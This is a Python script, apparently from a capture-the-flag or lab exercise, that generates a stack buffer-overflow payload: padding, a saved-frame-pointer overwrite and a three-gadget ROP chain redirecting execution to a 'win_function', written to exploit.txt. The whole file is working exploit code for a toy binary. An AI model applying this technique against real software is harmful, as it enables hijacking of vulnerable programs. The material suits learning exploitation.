import struct

def p32(addr):
    return struct.pack("<I", addr)

def generate_rop_exploit():
    pop_eax_ret = 0x08049199
    call_eax = 0x080491a1
    win_function = 0x080491e3

    # Crafting the payload
    padding = "A" * 64  # Padding to fill the buffer
    saved_ebp = "BBBBBBBB"  # Overwriting saved frame pointer

    # ROP chain
    rop_chain = [
        pop_eax_ret,
        win_function,  # Load win_function address into eax
        call_eax  # Call the address in eax
    ]

    # Create the exploit string
    exploit = padding.encode() + saved_ebp.encode() + b''.join([p32(gadget) for gadget in rop_chain])

    with open("exploit.txt", "wb") as f:
        f.write(exploit)

    print("ROP exploit input generated and written to exploit.txt")


if __name__ == "__main__":
    generate_rop_exploit()
